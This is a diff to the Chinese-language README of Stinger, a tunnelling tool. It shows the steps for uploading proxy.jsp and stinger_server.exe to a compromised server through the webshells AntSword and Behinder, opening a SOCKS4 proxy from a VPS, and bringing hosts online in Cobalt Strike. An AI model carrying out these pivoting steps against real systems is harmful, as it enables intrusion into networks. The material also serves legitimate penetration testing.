@@ -13,7 +13,7 @@
 ## SOCK4代理
 
 
-* proxy.jsp上传到目标服务器,确保 [http://example.com:8080/proxy.jsp](http://192.168.3.11:8080/proxy.jsp) 可以访问,页面返回 stinger XXX!
+* proxy.jsp上传到目标服务器,确保 [http://example.com:8080/proxy.jsp](http://example.com:8080/proxy.jsp) 可以访问,页面返回 stinger XXX!
 * 将stinger_server.exe上传到目标服务器,蚁剑/冰蝎执行```start D:/XXX/stinger_server.exe```启动服务端
 > 不要直接运行D:/XXX/stinger_server.exe,会导致tcp断连
 * vps执行```./stinger_client -w http://example.com:8080/proxy.jsp -l 0.0.0.0 -p 60000```
@@ -49,7 +49,7 @@ root@kali:~# ./stinger_client -w http://example.com:8080/proxy.jsp -l 127.0.0.1 
 
 ## cobalt strike单主机上线
 
-* proxy.jsp上传到目标服务器,确保 [http://example.com:8080/proxy.jsp](http://example.com:8080/proxy.jsp) 可以访问,页面返回 stinger XXX!
+* proxy.jsp上传到目标服务器,确保 [http://example.com:8080/proxy.jsp](http://example.com:8080/proxy.jsp) 可以访问,页面返回 stinger XXX!
 * 将stinger_server.exe上传到目标服务器,蚁剑/冰蝎执行```start D:/XXX/stinger_server.exe```启动服务端
 > 不要直接运行D:/XXX/stinger_server.exe,会导致tcp断连
 * stinger_client命令行执行```./stinger_client -w http://example.com:8080/proxy.jsp -l 0.0.0.0 -p 60000```
@@ -85,7 +85,7 @@ root@kali:~# ./stinger_client -w http://example.com:8080/proxy.jsp -l 127.0.0.1 
 
 ## cobalt strike多主机上线
 
-* proxy.jsp上传到目标服务器,确保 [http://example.com:8080/proxy.jsp](http://example.com:8080/proxy.jsp) 可以访问,页面返回 stinger XXX!
+* proxy.jsp上传到目标服务器,确保 [http://example.com:8080/proxy.jsp](http://example.com:8080/proxy.jsp) 可以访问,页面返回 stinger XXX!
 * 将stinger_server.exe上传到目标服务器,蚁剑/冰蝎执行```start D:/XXX/stinger_server.exe 192.168.3.11```启动服务端
 > 192.168.3.11可以改成0.0.0.0
 * stinger_client命令行执行```./stinger_client -w http://example.com:8080/proxy.jsp -l 127.0.0.1 -p 60000```
@@ -146,4 +146,3 @@ root@kali:~# ./stinger_client -w http://example.com:8080:8080/proxy.jsp -l 127.0
 **2.1**
 更新时间: 2020-01-07
 * 支持CS上线功能(即端口映射功能)
-
